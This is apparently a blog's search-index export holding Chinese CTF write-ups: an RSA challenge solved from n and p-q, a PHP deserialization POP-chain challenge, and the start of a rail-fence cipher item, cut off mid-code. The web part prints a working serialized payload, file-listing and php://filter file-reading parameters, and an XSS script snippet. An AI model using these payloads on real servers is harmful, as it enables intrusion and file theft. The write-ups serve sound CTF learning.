<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>刷题笔记:[2021江西省赛]ez rsa</title>
      <link href="/p/1992334403.html"/>
      <url>/p/1992334403.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>基友发的题，不难，但小有门槛，很值得一做。</p><p>题目给出了n,e,c,p-q</p><ul><li><p>n</p><pre class="line-numbers language-none"><code class="language-none">27552304606229034903366058815849954030287648695063385362955432137790872571412035824128918674719247737295565001575991597519270789776408208970323808016733976338433371328100880898942106515627607388226912870981180215883273805491209461671730377099185278711453949265641966582563910708529619185885928310168288810488784242368160743359666583499117949407921812317700250240067929572558785431071173411100434109661677786734923283679392823901052633992456780285091988542875991410528415886437666510014123352497264017734716859350294159440761760921548702546470902740121962033241003215821780125194400741190925169397917247376657863011603<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>e</p><pre class="line-numbers language-none"><code class="language-none">65537<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>c</p><pre class="line-numbers language-none"><code class="language-none">8643831704675414121804983915084443744489969712473300784256427784417167322852556975560503484179280700293119974607254037642425650493676448134024809335297135239994950178868535219541095694358323044214971760829173918774094415933808417722001811285178546917655837402000771685507972240389565704149610032767242977174132826100177368764169367458684152505611469248099487912367364804360878611296860803835816266114046682291529593099394952245852157119233687981777202751472502060481232341206366584532964027749320641690448228420342308891797513656897566100268729012788419021059054907653832828437666012596894150751431936476816983845357<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>p-q</p><pre class="line-numbers language-none"><code class="language-none">3216514606297172806828066063738105740383963382396892688569683235383985567043193404185955880509592930874764682428425994713750665248099953457550673860782324431970917492727256948066013701406000049963109681898567026552657377599263519201715733179565306750754520746601394738797021362510415215113118083969304423858<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>已知：</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-2021%E6%B1%9F%E8%A5%BF%E7%9C%81%E8%B5%9B-ez-rsa/image-20211025203948705-16351659635291.png"></p><p>然后配凑一下</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-2021%E6%B1%9F%E8%A5%BF%E7%9C%81%E8%B5%9B-ez-rsa/image-20211025203935030-16351659739372.png"></p><p>已知<code>n=pq</code>和<code>p-q</code>，所以可以在不算出p/q单个值的情况下直接算出m。算出m之后就是常规的rsa解法。</p><p>但问题来了，数字那么大，该怎么算？</p><p>掏出segamath</p><p>t是p-q</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">n <span class="token operator">=</span> <span class="token number">27552304606229034903366058815849954030287648695063385362955432137790872571412035824128918674719247737295565001575991597519270789776408208970323808016733976338433371328100880898942106515627607388226912870981180215883273805491209461671730377099185278711453949265641966582563910708529619185885928310168288810488784242368160743359666583499117949407921812317700250240067929572558785431071173411100434109661677786734923283679392823901052633992456780285091988542875991410528415886437666510014123352497264017734716859350294159440761760921548702546470902740121962033241003215821780125194400741190925169397917247376657863011603</span>t <span class="token operator">=</span> <span class="token number">3216514606297172806828066063738105740383963382396892688569683235383985567043193404185955880509592930874764682428425994713750665248099953457550673860782324431970917492727256948066013701406000049963109681898567026552657377599263519201715733179565306750754520746601394738797021362510415215113118083969304423858</span>m <span class="token operator">=</span> n<span class="token operator">-</span><span class="token punctuation">(</span>t<span class="token operator">*</span>t<span class="token operator">+</span><span class="token number">4</span><span class="token operator">*</span>n<span class="token punctuation">)</span><span class="token punctuation">.</span>sqrt<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token keyword">print</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>算出m：</p><pre class="line-numbers language-none"><code class="language-none">27552304606229034903366058815849954030287648695063385362955432137790872571412035824128918674719247737295565001575991597519270789776408208970323808016733976338433371328100880898942106515627607388226912870981180215883273805491209461671730377099185278711453949265641966582563910708529619185885928310168288810488452249048361792190062286900087513922744159737091583808351713622260845711638281055969511895420947879300731919183830759012447400161458551140739059886287572056575864045508330251848028360471591770162350542916982579543446708446143640478066426347229913784237231663261383992631285889273004630202243388356152746024080<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>普通python环境下会报错的。</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-2021%E6%B1%9F%E8%A5%BF%E7%9C%81%E8%B5%9B-ez-rsa/image-20211025195302692.png"></p><p>在segamath就可以跑。我原以为segamath仅仅是python库，调用其方法才能体现它的特别之处，但没想到它是把python内部都给改造成了合适的形状，可以直接进行大数计算，十分舒服！</p><p>然后就是rsa常规解法。</p><p>先求d，d是e在模m下的逆元：<code>d*e%m=1</code></p><p>再求明文plain，<code>plain=c^d%n</code></p><p>这里使用gmpy2，主要是segamath不知道怎么求模逆元。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> gmpy2 <span class="token keyword">as</span> gp<span class="token keyword">import</span> binasciic <span class="token operator">=</span> <span class="token number">8643831704675414121804983915084443744489969712473300784256427784417167322852556975560503484179280700293119974607254037642425650493676448134024809335297135239994950178868535219541095694358323044214971760829173918774094415933808417722001811285178546917655837402000771685507972240389565704149610032767242977174132826100177368764169367458684152505611469248099487912367364804360878611296860803835816266114046682291529593099394952245852157119233687981777202751472502060481232341206366584532964027749320641690448228420342308891797513656897566100268729012788419021059054907653832828437666012596894150751431936476816983845357</span>e <span class="token operator">=</span> <span class="token number">65537</span>m <span class="token operator">=</span> <span class="token number">27552304606229034903366058815849954030287648695063385362955432137790872571412035824128918674719247737295565001575991597519270789776408208970323808016733976338433371328100880898942106515627607388226912870981180215883273805491209461671730377099185278711453949265641966582563910708529619185885928310168288810488452249048361792190062286900087513922744159737091583808351713622260845711638281055969511895420947879300731919183830759012447400161458551140739059886287572056575864045508330251848028360471591770162350542916982579543446708446143640478066426347229913784237231663261383992631285889273004630202243388356152746024080</span>n <span class="token operator">=</span> <span class="token number">27552304606229034903366058815849954030287648695063385362955432137790872571412035824128918674719247737295565001575991597519270789776408208970323808016733976338433371328100880898942106515627607388226912870981180215883273805491209461671730377099185278711453949265641966582563910708529619185885928310168288810488784242368160743359666583499117949407921812317700250240067929572558785431071173411100434109661677786734923283679392823901052633992456780285091988542875991410528415886437666510014123352497264017734716859350294159440761760921548702546470902740121962033241003215821780125194400741190925169397917247376657863011603</span>d <span class="token operator">=</span> gp<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span> m<span class="token punctuation">)</span>plain <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>plain<span class="token punctuation">)</span>  <span class="token comment"># 算出的是10进制数</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>plain<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 将该十进制数转换为16进制数</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最后</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-2021%E6%B1%9F%E8%A5%BF%E7%9C%81%E8%B5%9B-ez-rsa/image-20211025203407026.png"></p>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Crypto </tag>
            
            <tag> RSA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>赛题笔记:浙江第四届省初赛</title>
      <link href="/p/3044068590.html"/>
      <url>/p/3044068590.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>第二次参加了，开局平台直接拉胯，崩了一个多小时，真滴无语。</p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="checkin"><a href="#checkin" class="headerlink" title="checkin"></a>checkin</h3><p>签到题，看下返回包的header，没什么好说的。</p><h3 id="pppop"><a href="#pppop" class="headerlink" title="pppop"></a>pppop</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">A1</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$tmp1</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$tmp2</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Enjoy Hacking!"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">tmp1</span><span class="token operator">-></span><span class="token function">hacking</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">A2</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$tmp1</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$tmp2</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">hacking</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Hacked By Bi0x"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">A3</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$tmp1</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$tmp2</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">hacking</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">tmp2</span><span class="token operator">-></span><span class="token function">get_flag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">A4</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$tmp1</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'1919810'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$tmp2</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">get_flag</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"flag&#123;"</span> <span class="token operator">.</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">tmp1</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"&#125;"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">A5</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$tmp1</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$tmp2</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__call</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token variable">$b</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$f</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">tmp1</span><span class="token punctuation">;</span>        <span class="token variable">$f</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">A6</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$tmp1</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$tmp2</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">tmp1</span><span class="token operator">-></span><span class="token function">hack4fun</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token string double-quoted-string">"114514"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">A7</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$tmp1</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"Hello World!"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$tmp2</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"114514"</span> <span class="token operator">.</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">tmp2</span> <span class="token operator">.</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">tmp1</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">A8</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$tmp1</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$tmp2</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">hack4fun</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Last step,Ganbadie~"</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'DAS'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">tmp1</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'DAS'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'CTF'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">tmp2</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'CTF'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">echo</span> <span class="token keyword">new</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">tmp1</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">tmp2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'DASCTF'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'DASCTF'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>反序列化题，pop链很简单，应该还有其他链</p><pre class="line-numbers language-none"><code class="language-none">A1 -&gt; A3 -&gt; A4 -&gt; A6 -&gt; A8<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">A1</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$tmp1</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$tmp2</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">tmp1</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">A3</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">A3</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$tmp1</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$tmp2</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">tmp2</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">A4</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">A4</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$tmp1</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'1919810'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$tmp2</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">tmp1</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">A6</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">A6</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$tmp1</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$tmp2</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">tmp1</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">A8</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">A8</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$tmp1</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$tmp2</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">A1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">?DASCTF&#x3D;O%3A2%3A%22A1%22%3A2%3A%7Bs%3A4%3A%22tmp1%22%3BO%3A2%3A%22A3%22%3A2%3A%7Bs%3A4%3A%22tmp1%22%3BN%3Bs%3A4%3A%22tmp2%22%3BO%3A2%3A%22A4%22%3A2%3A%7Bs%3A4%3A%22tmp1%22%3BO%3A2%3A%22A6%22%3A2%3A%7Bs%3A4%3A%22tmp1%22%3BO%3A2%3A%22A8%22%3A2%3A%7Bs%3A4%3A%22tmp1%22%3BN%3Bs%3A4%3A%22tmp2%22%3BN%3B%7Ds%3A4%3A%22tmp2%22%3BN%3B%7Ds%3A4%3A%22tmp2%22%3BN%3B%7D%7Ds%3A4%3A%22tmp2%22%3BN%3B%7D<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>问题就在于这里怎么利用</p><p><img src="/../images/%E8%B5%9B%E9%A2%98%E7%AC%94%E8%AE%B0-%E6%B5%99%E6%B1%9F%E7%AC%AC%E5%9B%9B%E5%B1%8A%E7%9C%81%E8%B5%9B/image-20211023194212594.png"></p><p>比赛的时候没想出来，事后问了问师傅，拿到篇文章</p><p><a href="https://mp.weixin.qq.com/s/PrIwbUtc8KoqWcVsWte_Rg">连异常报错也能拿到flag？</a></p><p>要点在于</p><blockquote><p>有括号的要先算括号内的</p></blockquote><p><img src="/../images/%E8%B5%9B%E9%A2%98%E7%AC%94%E8%AE%B0-%E6%B5%99%E6%B1%9F%E7%AC%AC%E5%9B%9B%E5%B1%8A%E7%9C%81%E8%B5%9B/image-20211023195520335.png"></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token function">mysqli_connect</span><span class="token punctuation">(</span><span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"root"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"root"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"mysql"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/../images/%E8%B5%9B%E9%A2%98%E7%AC%94%E8%AE%B0-%E6%B5%99%E6%B1%9F%E7%AC%AC%E5%9B%9B%E5%B1%8A%E7%9C%81%E8%B5%9B/image-20211023200144392.png"></p><p><img src="/../images/%E8%B5%9B%E9%A2%98%E7%AC%94%E8%AE%B0-%E6%B5%99%E6%B1%9F%E7%AC%AC%E5%9B%9B%E5%B1%8A%E7%9C%81%E8%B5%9B/image-20211023200302121.png"></p><p>还可以xss</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">echo</span> <span class="token keyword">new</span> <span class="token class-name">Exception</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//?1=&lt;script>alert("XSS");&lt;/script></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>当然，如果是http传入，会直接当做字符串打印出来。</p><p>所以换其他原生类</p><p>读文件：</p><p><code>*</code>是通配符</p><pre class="line-numbers language-none"><code class="language-none">&amp;DAS&#x3D;DirectoryIterator&amp;CTF&#x3D;glob:&#x2F;&#x2F;*<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../images/%E8%B5%9B%E9%A2%98%E7%AC%94%E8%AE%B0-%E6%B5%99%E6%B1%9F%E7%AC%AC%E5%9B%9B%E5%B1%8A%E7%9C%81%E8%B5%9B/image-20211023203512726.png"></p><p>文件名：<code>flaggggggggggg.php</code></p><p>读内容</p><pre class="line-numbers language-none"><code class="language-none">&amp;DAS&#x3D;SplFileObject&amp;CTF&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flaggggggggggg.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>解码，结束。</p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="Easy-Railfence"><a href="#Easy-Railfence" class="headerlink" title="Easy Railfence"></a>Easy Railfence</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token keyword">import</span> hashlib<span class="token keyword">from</span> flag <span class="token keyword">import</span> Rail<span class="token punctuation">,</span>Offset<span class="token punctuation">,</span>m<span class="token keyword">def</span> <span class="token function">encrypt</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span>rails<span class="token punctuation">,</span>offset<span class="token punctuation">)</span><span class="token punctuation">:</span>    c <span class="token operator">=</span> <span class="token string">'$'</span> <span class="token operator">*</span> offset <span class="token operator">+</span> c    length <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span>    result <span class="token operator">=</span> <span class="token punctuation">&#123;</span>x<span class="token punctuation">:</span> <span class="token string">""</span> <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>rails<span class="token punctuation">)</span><span class="token punctuation">&#125;</span>    <span class="token keyword">for</span> a <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">:</span>        width <span class="token operator">=</span> rails <span class="token operator">*</span> <span class="token number">2</span> <span class="token operator">-</span> <span class="token number">2</span>        num <span class="token operator">=</span> a <span class="token operator">%</span> width        <span class="token keyword">if</span> <span class="token punctuation">(</span>num <span class="token operator">&lt;</span> rails<span class="token punctuation">)</span><span class="token punctuation">:</span>            result<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token punctuation">&#123;</span>num<span class="token punctuation">:</span> result<span class="token punctuation">[</span>num<span class="token punctuation">]</span> <span class="token operator">+</span> c<span class="token punctuation">[</span>a<span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            ll <span class="token operator">=</span> <span class="token number">2</span> <span class="token operator">*</span> rails <span class="token operator">-</span> <span class="token number">2</span> <span class="token operator">-</span> num            result<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token punctuation">&#123;</span>ll<span class="token punctuation">:</span> result<span class="token punctuation">[</span>ll<span class="token punctuation">]</span> <span class="token operator">+</span> c<span class="token punctuation">[</span>a<span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    d <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">for</span> k <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>rails<span class="token 